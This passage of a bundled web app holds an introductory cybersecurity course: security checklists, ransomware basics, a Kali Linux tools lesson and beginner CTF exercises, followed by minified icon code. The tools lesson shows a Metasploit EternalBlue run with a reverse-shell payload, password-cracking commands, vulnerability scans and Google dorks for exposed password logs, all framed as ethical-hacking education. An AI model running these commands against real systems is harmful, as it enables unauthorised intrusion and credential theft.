✅ Keep browser updated
✅ Review extensions (remove unused ones)
\`\`\`

### Phone Security

\`\`\`
✅ Enable screen lock (PIN, fingerprint, face)
✅ Keep OS and apps updated
✅ Only install apps from official stores
✅ Review app permissions
   (Does a flashlight need your contacts? NO!)
✅ Enable "Find My Device"
✅ Encrypt your phone (usually on by default)
\`\`\`

### Social Media Security

\`\`\`
✅ Make profiles private
✅ Don't share:
   - Full birthday
   - Home address
   - School/work location in real-time
   - Vacation plans ("We're away for 2 weeks!")
✅ Review tagged photos
✅ Enable login notifications
✅ Check connected apps regularly
\`\`\`

### Email Security

\`\`\`
✅ Use unique password + 2FA
✅ Don't click links in suspicious emails
✅ Check sender address carefully
✅ Don't open unexpected attachments
✅ Use separate emails:
   - Personal email
   - Shopping/accounts email
   - Throwaway for signups
\`\`\`

### Wi-Fi Security

\`\`\`
✅ Never use public Wi-Fi for banking
✅ Use VPN on public networks
✅ Forget networks when done
✅ Don't auto-connect to open networks
✅ Use your phone hotspot instead
\`\`\`

<warning>
⚠️ Public Wi-Fi is NEVER safe! Anyone on the same network can potentially see your traffic.
</warning>

### Backup Strategy: 3-2-1 Rule

\`\`\`
3 copies of your data
2 different types of storage
1 offsite copy

Example:
1. Your computer (original)
2. External hard drive (local backup)
3. Cloud storage (offsite backup)
\`\`\`

### Software Updates

\`\`\`
Updates often fix security vulnerabilities:

"Critical security patch available"
→ Install it NOW, not later!

Auto-updates: ENABLE THEM
- Operating system
- Browser
- Phone apps
- Router firmware
\`\`\`

### If You Get Hacked

\`\`\`
1. Change passwords IMMEDIATELY
   (start with email!)
2. Enable 2FA on everything
3. Check for unauthorized access
4. Scan for malware
5. Notify affected services
6. Monitor financial accounts
7. Learn from it!
\`\`\`

<tip>
💡 Check if your email has been in a breach: haveibeenpwned.com — It's free and run by a security researcher!
</tip>

### Your Security Score

Rate yourself:
\`\`\`
[ ] Unique passwords for every account
[ ] Password manager in use
[ ] 2FA on email and banking
[ ] Phone has screen lock
[ ] Browser is up to date
[ ] Don't click suspicious links
[ ] Backups are current
[ ] Wi-Fi uses WPA2/WPA3
[ ] Social media is private

7-9: 🟢 Great security!
4-6: 🟡 Getting there
0-3: 🔴 You're at risk!
\`\`\`

### Ransomware — The Modern Plague

\`\`\`
How ransomware works:
1. You click a malicious link/attachment
2. Malware encrypts ALL your files
3. You see a ransom note:
   "Pay $5,000 in Bitcoin or lose your files forever!"
4. You either pay (no guarantee they'll decrypt)
   or restore from backup

PREVENTION:
├── Don't open suspicious attachments
├── Keep software updated (patches vulnerabilities)
├── Use antivirus with real-time protection
├── MAINTAIN BACKUPS (the ultimate defense!)
└── Use email filtering for malicious attachments

FAMOUS RANSOMWARE:
├── WannaCry (2017) — Hit 200K+ computers worldwide
├── NotPetya (2017) — $10B in damages globally
├── Colonial Pipeline (2021) — Shut down US fuel supply
└── REvil (2021) — $70M ransom demand from Kaseya
\`\`\`

<warning>
⚠️ Paying the ransom funds criminal operations and doesn't guarantee file recovery. The FBI recommends NOT paying. Always maintain backups instead!
</warning>

### Privacy Tools

\`\`\`
BROWSER:
├── Firefox (privacy-focused settings)
├── Brave (built-in ad/tracker blocking)
└── Tor Browser (maximum anonymity)

SEARCH ENGINE:
├── DuckDuckGo (doesn't track searches)
└── Startpage (Google results, no tracking)

EMAIL:
├── ProtonMail (end-to-end encrypted)
└── Tutanota (encrypted, open-source)

MESSAGING:
├── Signal (gold standard for private messaging)
└── Wire (encrypted team communication)

DNS:
├── 1.1.1.1 (Cloudflare — fast, private)
└── 9.9.9.9 (Quad9 — blocks malicious domains)
\`\`\`

### Incident Response Plan

\`\`\`
IF YOU SUSPECT A BREACH:

STEP 1: CONTAIN
  ├── Disconnect from network
  ├── Don't turn off the computer (preserve evidence!)
  └── Change passwords from a different device

STEP 2: IDENTIFY
  ├── What was accessed?
  ├── How did they get in?
  └── When did it start?

STEP 3: ERADICATE
  ├── Remove malware
  ├── Close the vulnerability
  └── Reset all affected credentials

STEP 4: RECOVER
  ├── Restore from clean backups
  ├── Verify everything works
  └── Monitor for re-compromise

STEP 5: LEARN
  ├── Document what happened
  ├── Update security measures
  └── Train to prevent recurrence
\`\`\`

Security is a journey, not a destination! 🛡️
          `}]},{id:7,title:"Ethical Hacking Tools",description:"Tools of the trade",lessons:[{id:"7-1",title:"Kali Linux & Hacking Tools",duration:"12 min",content:`
## The Hacker's Toolkit 🧰

Professional security researchers use specialized tools. Let's explore them!

### Kali Linux

The #1 operating system for ethical hacking:

\`\`\`
What: Linux distro pre-loaded with 600+ security tools
Where: kali.org (free!)
How: Run in VirtualBox or as USB boot
\`\`\`

### Setting Up Kali (In VirtualBox)

\`\`\`bash
# 1. Download VirtualBox (free)
#    virtualbox.org

# 2. Download Kali Linux VM image
#    kali.org/get-kali/

# 3. Import into VirtualBox
#    File → Import Appliance → Select .ova file

# 4. Start it up!
#    Default login: kali / kali
\`\`\`

### Essential Tools Overview

| Tool | Category | What It Does |
|------|----------|-------------|
| **Nmap** | Scanning | Network/port scanning |
| **Wireshark** | Analysis | Packet capture & analysis |
| **Burp Suite** | Web | Web app testing |
| **Metasploit** | Exploitation | Vulnerability exploitation |
| **John the Ripper** | Passwords | Password cracking |
| **Hashcat** | Passwords | GPU-accelerated cracking |
| **Aircrack-ng** | Wireless | Wi-Fi security testing |
| **Hydra** | Passwords | Online brute force |
| **SQLMap** | Web | Automated SQL injection |
| **Nikto** | Web | Web server scanner |

### Nmap Deep Dive

\`\`\`bash
# Basic scan
nmap target.com

# Scan all ports
nmap -p- target.com

# Detect operating system
nmap -O target.com

# Detect services and versions
nmap -sV target.com

# Aggressive scan (OS + services + scripts)
nmap -A target.com

# Scan for vulnerabilities
nmap --script vuln target.com
\`\`\`

### Burp Suite — Web App Testing

\`\`\`
Your Browser → [Burp Proxy] → Website
                    ↓
        See & modify EVERY request!

1. Intercept login requests
2. Modify parameters
3. Replay requests
4. Find hidden endpoints
\`\`\`

### Metasploit Framework

The exploitation Swiss army knife:

\`\`\`bash
# Start Metasploit
msfconsole

# Search for exploits
search apache
search type:exploit platform:windows

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your_ip
exploit
\`\`\`

<warning>
⚠️ ONLY use these tools on systems you have WRITTEN PERMISSION to test! Unauthorized use is a crime.
</warning>

### Password Cracking Tools

\`\`\`bash
# John the Ripper - crack password hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hashcat - GPU-accelerated (much faster!)
hashcat -m 0 -a 0 hashes.txt rockyou.txt
\`\`\`

### Practice Platforms

Safe, legal places to practice:

\`\`\`
🎯 TryHackMe.com     — Guided rooms, beginner-friendly
🎯 HackTheBox.com    — Realistic challenges
🎯 PicoCTF.org       — Student CTF competitions
🎯 OverTheWire.org   — Wargames (start with Bandit)
🎯 DVWA              — Practice web hacking locally
\`\`\`

<tip>
💡 Start with TryHackMe — it has learning paths from absolute beginner to advanced! And it's free.
</tip>

### Career Paths in Cybersecurity

| Role | What They Do | Avg Salary |
|------|-------------|-----------|
| Security Analyst | Monitor & respond to threats | $80K |
| Penetration Tester | Hack companies (legally!) | $100K |
| Security Engineer | Build secure systems | $120K |
| Bug Bounty Hunter | Find bugs for rewards | Varies ($$$) |
| CISO | Lead security strategy | $200K+ |

### Certifications to Consider

\`\`\`
Beginner:
  CompTIA Security+
  CEH (Certified Ethical Hacker)

Intermediate:
  OSCP (Offensive Security Certified Professional)
  CySA+

Advanced:
  CISSP
  OSCE
\`\`\`

### The Penetration Testing Methodology

\`\`\`
A professional penetration test follows these phases:

Phase 1: RECONNAISSANCE
├── Passive (OSINT — no touching the target)
│   ├── Google dorking
│   ├── Social media research
│   ├── WHOIS lookups
│   └── Shodan searches
│
└── Active (touching the target)
    ├── Port scanning (nmap)
    ├── Service enumeration
    └── DNS zone transfers

Phase 2: SCANNING & ENUMERATION
├── Vulnerability scanning (Nessus, OpenVAS)
├── Web directory bruteforcing (gobuster, dirb)
├── Service version detection
└── Banner grabbing

Phase 3: EXPLOITATION
├── Attempt known vulnerabilities
├── Test weak credentials
├── Try SQL injection, XSS, etc.
└── Social engineering (if in scope)

Phase 4: POST-EXPLOITATION
├── Privilege escalation
├── Lateral movement
├── Data access assessment
└── Persistence demonstration

Phase 5: REPORTING
├── Executive summary
├── Technical findings
├── Risk ratings (Critical/High/Medium/Low)
├── Remediation recommendations
└── Proof of concept evidence
\`\`\`

### Linux Command Line Essentials

\`\`\`bash
# Essential Linux commands for cybersecurity:

# File operations
ls -la          # List files (including hidden)
cat file.txt    # Display file contents
grep "password" file.txt  # Search for text
find / -name "*.conf"     # Find config files

# Network commands
ifconfig        # Network interfaces
netstat -tulpn  # Open ports and connections
curl -I site.com  # HTTP headers
wget file.url   # Download files

# Process management
ps aux          # All running processes
kill -9 PID     # Force kill a process
top             # Real-time process monitor

# Permissions
chmod 600 key   # Set file permissions
chown user file # Change ownership
sudo command    # Run as root

# Text processing
cat file | grep "error"  # Filter lines
sort file.txt | uniq     # Remove duplicates
wc -l file.txt           # Count lines
\`\`\`

<tip>
💡 Get comfortable with the Linux terminal — nearly all cybersecurity tools run from the command line. Practice daily!
</tip>

### Bug Bounty Programs

Get PAID to find security vulnerabilities:

\`\`\`
PLATFORM        COMPANIES            TYPICAL BOUNTIES
HackerOne       Many Fortune 500     $100 - $100,000+
Bugcrowd        Major tech companies $50 - $50,000+
Synack          Government, finance  Invite-only
Direct programs Google, Apple, Meta  Up to $1,000,000!

TOP BUG BOUNTY PAYOUTS:
├── Apple: $100,000 for kernel exploits
├── Google: Up to $250,000 for Android exploits
├── Microsoft: Up to $250,000 for Hyper-V
└── Facebook: $30,000+ for account takeover bugs

Getting started:
1. Learn web hacking thoroughly
2. Start on HackerOne (beginner programs)
3. Read disclosed reports (learn from others)
4. Focus on one vulnerability type first
5. Be patient — it takes time!
\`\`\`

You now know the tools of the trade! Use them wisely! 🛡️
          `}]},{id:8,title:"Capture The Flag",description:"Put your skills to the test",lessons:[{id:"8-1",title:"Your First CTF Challenge",duration:"15 min",content:`
## Capture The Flag! 🏁

**CTF (Capture The Flag)** competitions are how hackers test their skills!

### What is a CTF?

Teams or individuals solve security challenges to find hidden "flags":

\`\`\`
Challenge: "Find the hidden message in this website"
You hack → find → flag{y0u_f0und_th3_s3cr3t}
Submit flag → earn points! 🏆
\`\`\`

### CTF Categories

| Category | What You Do |
|----------|-------------|
| **Web** | Hack websites (XSS, SQLi, etc.) |
| **Crypto** | Break encryption |
| **Forensics** | Analyze files, memory dumps |
| **Reversing** | Reverse engineer programs |
| **Pwn** | Exploit binary programs |
| **OSINT** | Find info from public sources |
| **Misc** | Everything else! |

### Challenge 1: Decode This!

\`\`\`
Find the flag:
ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259
\`\`\`

Hint: It's Base64 encoded!

\`\`\`bash
echo "ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259" | base64 -d
# Output: flag{base64_is_not_encryption}
\`\`\`

<tip>
💡 Base64 is encoding, NOT encryption! Anyone can decode it. It's used for data transport, not security.
</tip>

### Challenge 2: Hidden in Plain Sight

\`\`\`html
<!-- Look at a website's source code -->
<!-- Right-click → View Page Source -->
<!-- Or press Ctrl+U -->

<html>
<head><title>Nothing here...</title></head>
<body>
  <p>This page is empty.</p>
  <!-- flag{always_check_the_source} -->
</body>
</html>
\`\`\`

Developers sometimes leave secrets in HTML comments!

### Challenge 3: HTTP Headers

\`\`\`bash
# Check response headers
curl -I https://challenge.ctf.com

# HTTP/1.1 200 OK
# Content-Type: text/html
# X-Secret-Flag: flag{headers_hide_secrets}
# Server: nginx
\`\`\`

### Challenge 4: robots.txt

\`\`\`bash
# Websites tell search engines what NOT to index
curl https://challenge.ctf.com/robots.txt

# User-agent: *
# Disallow: /secret-admin-panel/
# Disallow: /flag.txt

# Now visit /flag.txt!
curl https://challenge.ctf.com/flag.txt
# flag{robots_txt_is_not_security}
\`\`\`

### Challenge 5: Caesar Cipher Crack

\`\`\`
Encrypted: synt{pnrfne_pvcure_vf_jrnx}
\`\`\`

\`\`\`python
# Try all 26 shifts
def caesar_crack(text):
    for shift in range(26):
        result = ""
        for char in text:
            if char.isalpha():
                base = ord('a') if char.islower() else ord('A')
                result += chr((ord(char) - base + shift) % 26 + base)
            else:
                result += char
        if "flag" in result.lower():
            print(f"Shift {shift}: {result}")

caesar_crack("synt{pnrfne_pvcure_vf_jrnx}")
# Shift 13: flag{caesar_cipher_is_weak}
\`\`\`

This is **ROT13** — a Caesar cipher with shift of 13!

### OSINT Challenge

Find information using only public sources:

\`\`\`
Task: "What is the CEO's email at ExampleCorp?"

Sources to check:
1. Company website (About page)
2. LinkedIn profiles
3. GitHub repositories (check commits!)
4. Google dorking: "ExampleCorp" "CEO" "@"
5. WHOIS records for their domain
6. Cached pages
\`\`\`

### Google Dorking

Advanced Google searches for finding exposed data:

\`\`\`
site:example.com filetype:pdf    → PDFs on a site
intitle:"index of" passwords     → Exposed directories
inurl:admin login                → Admin pages
"password" filetype:log          → Log files with passwords
\`\`\`

<warning>
⚠️ Google dorking to find vulnerabilities in sites you don't own can be illegal. Only use on CTF challenges or with permission!
</warning>

### Where to Play CTFs

\`\`\`
🏁 PicoCTF.org          — Best for beginners!
🏁 CTFtime.org          — Calendar of CTF events
🏁 TryHackMe.com        — Guided challenges
🏁 HackTheBox.com       — Real-world scenarios
🏁 OverTheWire (Bandit)  — Linux command challenges
🏁 CryptoHack.org       — Cryptography challenges
\`\`\`

### Start Your Journey!

\`\`\`
1. Sign up on PicoCTF or TryHackMe
2. Start with the easiest challenges
3. Google when you're stuck (that's how you learn!)
4. Join a team or community
5. Practice regularly
6. Enter real CTF competitions!
\`\`\`

<tip>
💡 The cybersecurity community is incredibly helpful. Join Discord servers, Reddit's r/netsec, and ask questions!
</tip>

### Cryptography Challenge Walkthrough

\`\`\`python
# CHALLENGE: Decode this message
# "Gur cnffjbeq vf syntvfsha"
# Hint: ROT13

import codecs

encoded = "Gur cnffjbeq vf syntvfsha"
decoded = codecs.decode(encoded, 'rot_13')
print(decoded)  # "The password is flagisfun"

# ROT13 shifts each letter by 13 positions
# A→N, B→O, C→P, etc.
# Applying ROT13 twice gives you the original text!
\`\`\`

### Steganography Challenge

\`\`\`bash
# CHALLENGE: Find the hidden message in an image
# Steganography = hiding data inside other files

# Check for hidden strings in an image
strings suspicious_image.png | grep "flag"

# Use steghide to extract hidden data
steghide extract -sf image.jpg -p password

# Use binwalk to check for embedded files
binwalk -e mystery_file.png

# Check EXIF metadata
exiftool image.jpg | grep -i "comment"
\`\`\`

### Forensics Challenge

\`\`\`bash
# CHALLENGE: Analyze a network capture
# Open the .pcap file in Wireshark

# Filter for HTTP traffic
# Display Filter: http

# Find passwords transmitted in plain text
# Display Filter: http.request.method == "POST"

# Export HTTP objects (files transferred)
# File → Export Objects → HTTP

# Look for suspicious DNS queries
# Display Filter: dns

# Find base64-encoded data
echo "ZmxhZ3toZWxsb193b3JsZH0=" | base64 -d
# Output: flag{hello_world}
\`\`\`

### Binary / Reverse Engineering Challenge

\`\`\`bash
# CHALLENGE: Find the password in a compiled program

# Check for readable strings
strings mystery_program | grep -i "pass"

# Run in a debugger
gdb ./mystery_program
(gdb) break main
(gdb) run
(gdb) next    # Step through code
(gdb) info registers  # Check register values

# Disassemble to see assembly code
objdump -d mystery_program | less

# Use ltrace to see library calls
ltrace ./mystery_program
# Output might show: strcmp("your_input", "s3cr3t_p@ss")
\`\`\`

### CTF Tips & Strategies

\`\`\`
BEGINNER STRATEGIES:
━━━━━━━━━━━━━━━━━━━
1. Always check the page source (Ctrl+U)
2. Look at HTTP headers (browser dev tools)
3. Try common passwords before brute-forcing
4. Google the error messages you find
5. Check for robots.txt and .git directories
6. Base64 decode everything that looks encoded
7. Comments in HTML/code often contain hints

INTERMEDIATE STRATEGIES:
━━━━━━━━━━━━━━━━━━━━━━━
1. Automate with Python scripts
2. Use CyberChef (online decoder) for encoding chains
3. Look for backup files (.bak, .old, ~)
4. Test all input fields for injection
5. Enumerate users, directories, parameters
6. Chain multiple small vulnerabilities together

TEAM STRATEGIES:
━━━━━━━━━━━━━━━━━
1. Divide by category specialization
2. Share findings in a shared document
3. Don't all work on the same challenge
4. Get the easy points first (low-hanging fruit)
5. Take breaks — fresh eyes find flags
\`\`\`

<tip>
💡 The cybersecurity community is incredibly helpful. Join Discord servers, Reddit's r/netsec and r/hacking, and ask questions. Everyone started as a beginner!
</tip>

### Your Learning Roadmap

\`\`\`
MONTH 1: FOUNDATIONS
□ Complete TryHackMe "Complete Beginner" path
□ Set up a home lab (VirtualBox + Kali)
□ Practice Linux commands daily
□ Solve 10 beginner CTF challenges

MONTH 2: WEB SECURITY
□ Complete PortSwigger Web Security Academy
□ Practice SQL injection on DVWA
□ Learn Burp Suite thoroughly
□ Solve 20 web CTF challenges

MONTH 3: NETWORK SECURITY
□ Master Nmap and Wireshark
□ Complete TryHackMe network rooms
□ Practice with Metasploit
□ Start on HackTheBox easy machines

MONTH 4-6: SPECIALIZATION
□ Choose a focus area:
  - Web application security
  - Network penetration testing
  - Reverse engineering
  - Forensics & incident response
□ Start working toward CompTIA Security+
□ Enter your first live CTF competition!
\`\`\`

Congratulations! You've completed the Cybersecurity course! 🎉

You now have the foundation to:
- **Protect yourself** and your family online
- **Understand attacks** from the attacker's perspective
- **Use security tools** ethically and responsibly
- **Start a career** in one of the highest-demand tech fields
- **Compete in CTFs** and test your skills against others

**Remember:** The ethical hacking community has a golden rule — **never hack what you don't have permission to hack.** Use your powers for good, and the cybersecurity world will welcome you with open arms.

Stay curious, stay ethical, and keep learning! 🛡️🚀
          `}]}]};const Nh=(...w)=>w.filter((B,X,m)=>!!B&&B.trim()!==""&&m.indexOf(B)===X).join(" ").trim();const Xp=w=>w.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase();const Qp=w=>w.replace(/^([A-Z])|[\s-_]+(\w)/g,(B,X,m)=>m?m.toUpperCase():X.toLowerCase());const oh=w=>{const B=Qp(w);return B.charAt(0).toUpperCase()+B.slice(1)};var Kp={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};const Zp=w=>{for(const B in w)if(B.startsWith("aria-")||B==="role"||B==="title")return!0;return!1};const Wp=$.forwardRef(({color:w="currentColor",size:B=24,strokeWidth:X=2,absoluteStrokeWidth:m,className:H="",children:J,iconNode:ce,...Me},q)=>$.createElement("svg",{ref:q,...Kp,width:B,height:B,stroke:w,strokeWidth:m?Number(X)*24/Number(B):X,className:Nh("lucide",H),...!J&&!Zp(Me)&&{"aria-hidden":"true"},...Me},[...ce.map(([j,ue])=>$.createElement(j,ue)),...Array.isArray(J)?J:[J]]));const ae=(w,B)=>{const X=$.forwardRef(({className:m,...H},J)=>$.createElement(Wp,{ref:J,iconNode:B,className:Nh(`lucide-${Xp(oh(w))}`,`lucide-${w}`,m),...H}));return X.displayName=oh(w),X};const Jp=[["rect",{width:"20",height:"5",x:"2",y:"3",rx:"1",key:"1wp1u1"}],["path",{d:"M4 8v11a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8",key:"1s80jp"}],["path",{d:"M10 12h4",key:"a56b0p"}]],Fp=ae("archive",Jp);const $p=[["path",{d:"M12 5v14",key:"s699le"}],["path",{d:"m19 12-7 7-7-7",key:"1idqje"}]],rh=ae("arrow-down",$p);const Ip=[["path",{d:"m5 12 7-7 7 7",key:"hav0vg"}],["path",{d:"M12 19V5",key:"x0mq9r"}]],dh=ae("arrow-up",Ip);const Pp=[["path",{d:"M12 7v14",key:"1akyts"}],["path",{d:"M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z",key:"ruj8y"}]],ni=ae("book-open",Pp);const ey=[["path",{d:"M3 3v16a2 2 0 0 0 2 2h16",key:"c24i48"}],["path",{d:"M18 17V9",key:"2bz60n"}],["path",{d:"M13 17V5",key:"1frdt8"}],["path",{d:"M8 17v-3",key:"17ska0"}]],fh=ae("chart-column",ey);const ty=[["path",{d:"m6 9 6 6 6-6",key:"qrunsl"}]],ay=ae("chevron-down",ty);const ly=[["path",{d:"m9 18 6-6-6-6",key:"mthhwq"}]],ii=ae("chevron-right",ly);const ny=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m9 12 2 2 4-4",key:"dzmm74"}]],ta=ae("circle-check",ny);const iy=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m15 9-6 6",key:"1uzhvr"}],["path",{d:"m9 9 6 6",key:"z0biqf"}]],no=ae("circle-x",iy);const sy=[["path",{d:"M12 6v6l4 2",key:"mmk7yg"}],["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}]],io=ae("clock",sy);const cy=[["path",{d:"m16 18 6-6-6-6",key:"eg8j8"}],["path",{d:"m8 6-6 6 6 6",key:"ppft3o"}]],Fu=ae("code",cy);const uy=[["rect",{width:"14",height:"14",x:"8",y:"8",rx:"2",ry:"2",key:"17jyea"}],["path",{d:"M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2",key:"zix9uf"}]],$u=ae("copy",uy);const oy=[["path",{d:"M12 15V3",key:"m9g1x1"}],["path",{d:"M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",key:"ih7n3h"}],["path",{d:"m7 10 5 5 5-5",key:"brsn70"}]],hh=ae("download",oy);const ry=[["path",{d:"M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49",key:"ct8e1f"}],["path",{d:"M14.084 14.158a3 3 0 0 1-4.242-4.242",key:"151rxh"}],["path",{d:"M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143",key:"13bj9a"}],["path",{d:"m2 2 20 20",key:"1ooewy"}]],dy=ae("eye-off",ry);const fy=[["path",{d:"M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0",key:"1nclc0"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]],Iu=ae("eye",fy);const hy=[["path",{d:"M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z",key:"1oefj6"}],["path",{d:"M14 2v5a1 1 0 0 0 1 1h5",key:"wfsgrz"}],["path",{d:"M10 12.5 8 15l2 2.5",key:"1tg20x"}],["path",{d:"m14 12.5 2 2.5-2 2.5",key:"yinavb"}]],my=ae("file-code",hy);const py=[["path",{d:"M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z",key:"1oefj6"}],["path",{d:"M14 2v5a1 1 0 0 0 1 1h5",key:"wfsgrz"}],["path",{d:"M12 18v-6",key:"17g6i2"}],["path",{d:"m9 15 3 3 3-3",key:"1npd3o"}]],yy=ae("file-down",py);const gy=[["path",{d:"M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z",key:"1oefj6"}],["path",{d:"M14 2v5a1 1 0 0 0 1 1h5",key:"wfsgrz"}],["path",{d:"M10 9H8",key:"b1mrlr"}],["path",{d:"M16 13H8",key:"t4e002"}],["path",{d:"M16 17H8",key:"z1uh3a"}]],mh=ae("file-text",gy);const vy=[["path",{d:"M20 10a1 1 0 0 0 1-1V6a1 1 0 0 0-1-1h-2.5a1 1 0 0 1-.8-.4l-.9-1.2A1 1 0 0 0 15 3h-2a1 1 0 0 0-1 1v5a1 1 0 0 0 1 1Z",key:"hod4my"}],["path",{d:"M20 21a1 1 0 0 0 1-1v-3a1 1 0 0 0-1-1h-2.9a1 1 0 0 1-.88-.55l-.42-.85a1 1 0 0 0-.92-.6H13a1 1 0 0 0-1 1v5a1 1 0 0 0 1 1Z",key:"w4yl2u"}],["path",{d:"M3 5a2 2 0 0 0 2 2h3",key:"f2jnh7"}],["path",{d:"M3 3v13a2 2 0 0 0 2 2h3",key:"k8epm1"}]],Es=ae("folder-tree",vy);const Sy=[["path",{d:"M15 21v-8a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v8",key:"5wwlr5"}],["path",{d:"M3 10a2 2 0 0 1 .709-1.528l7-6a2 2 0 0 1 2.582 0l7 6A2 2 0 0 1 21 10v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z",key:"r6nss1"}]],by=ae("house",Sy);const xy=[["rect",{width:"18",height:"18",x:"3",y:"3",rx:"2",ry:"2",key:"1m3agn"}],["circle",{cx:"9",cy:"9",r:"2",key:"af1f0g"}],["path",{d:"m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21",key:"1xmnt7"}]],Ty=ae("image",xy);const Ny=[["rect",{width:"7",height:"9",x:"3",y:"3",rx:"1",key:"10lvy0"}],["rect",{width:"7",height:"5",x:"14",y:"3",rx:"1",key:"16une8"}],["rect",{width:"7",height:"9",x:"14",y:"12",rx:"1",key:"1hutg5"}],["rect",{width:"7",height:"5",x:"3",y:"16",rx:"1",key:"ldoo1y"}]],ph=ae("layout-dashboard",Ny);const Cy=[["path",{d:"M15 14c.2-1 .7-1.7 1.5-2.5 1-.9 1.5-2.2 1.5-3.5A6 6 0 0 0 6 8c0 1 .2 2.2 1.5 3.5.7.7 1.3 1.5 1.5 2.5",key:"1gvzjb"}],["path",{d:"M9 18h6",key:"x1upvd"}],["path",{d:"M10 22h4",key:"ceow96"}]],ws=ae("lightbulb",Cy);const jy=[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 10 0v4",key:"fwvmzm"}]],Ay=ae("lock",jy);const Ey=[["path",{d:"M4 5h16",key:"1tepv9"}],["path",{d:"M4 12h16",key:"1lakjw"}],["path",{d:"M4 19h16",key:"1djgab"}]],wy=ae("menu",Ey);const Oy=[["path",{d:"M22 17a2 2 0 0 1-2 2H6.828a2 2 0 0 0-1.414.586l-2.202 2.202A.71.71 0 0 1 2 21.286V5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2z",key:"18887p"}]],yh=ae("message-square",Oy);const zy=[["path",{d:"M13 21h8",key:"1jsn5i"}],["path",{d:"M21.174 6.812a1 1 0 0 0-3.986-3.987L3.842 16.174a2 2 0 0 0-.5.83l-1.321 4.352a.5.5 0 0 0 .623.622l4.353-1.32a2 2 0 0 0 .83-.497z",key:"1a8usu"}]],cn=ae("pen-line",zy);const ky=[["path",{d:"M5 5a2 2 0 0 1 3.008-1.728l11.997 6.998a2 2 0 0 1 .003 3.458l-12 7A2 2 0 0 1 5 19z",key:"10ikf1"}]],My=ae("play",ky);const Dy=[["path",{d:"M5 12h14",key:"1ays0h"}],["path",{d:"M12 5v14",key:"s699le"}]],gh=ae("plus",Dy);const _y=[["path",{d:"M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8",key:"v9h5vc"}],["path",{d:"M21 3v5h-5",key:"1q7to0"}],["path",{d:"M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16",key:"3uifl3"}],["path",{d:"M8 16H3v5",key:"1cv678"}]],Hy=ae("refresh-cw",_y);const Ry=[["path",{d:"M15.2 3a2 2 0 0 1 1.4.6l3.8 3.8a2 2 0 0 1 .6 1.4V19a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2z",key:"1c8476"}],["path",{d:"M17 21v-7a1 1 0 0 0-1-1H8a1 1 0 0 0-1 1v7",key:"1ydtos"}],["path",{d:"M7 3v4a1 1 0 0 0 1 1h7",key:"t51u73"}]],Ch=ae("save",Ry);const Ly=[["path",{d:"m21 21-4.34-4.34",key:"14j7rj"}],["circle",{cx:"11",cy:"11",r:"8",key:"4ej97u"}]],Pu=ae("search",Ly);const Uy=[["path",{d:"M9.671 4.136a2.34 2.34 0 0 1 4.659 0 2.34 2.34 0 0 0 3.319 1.915 2.34 2.34 0 0 1 2.33 4.033 2.34 2.34 0 0 0 0 3.831 2.34 2.34 0 0 1-2.33 4.033 2.34 2.34 0 0 0-3.319 1.915 2.34 2.34 0 0 1-4.659 0 2.34 2.34 0 0 0-3.32-1.915 2.34 2.34 0 0 1-2.33-4.033 2.34 2.34 0 0 0 0-3.831A2.34 2.34 0 0 1 6.35 6.051a2.34 2.34 0 0 0 3.319-1.915",key:"1i5ecw"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]],so=ae("settings",Uy);const By=[["path",{d:"M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",key:"oel41y"}]],Os=ae("shield",By);const Yy=[["path",{d:"M21 10.656V19a2 2 0 0 1-2 2H5a2 2 0 0 